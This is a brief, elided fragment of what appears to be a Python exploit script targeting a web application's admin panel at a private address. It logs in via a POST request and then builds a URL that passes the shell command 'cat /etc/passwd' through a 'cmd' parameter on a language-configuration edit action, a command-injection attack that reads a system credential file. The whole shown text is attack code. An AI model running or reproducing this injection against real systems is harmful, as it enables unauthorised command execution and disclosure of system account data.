...
login_txt = r_clients.post("http://10.9.119.245/admin/index.php", data=data1).text
...
exec_url = "http://10.9.119.245/admin/index.php?module=config-languages&action=edit&cmd=cat+/etc/passwd"
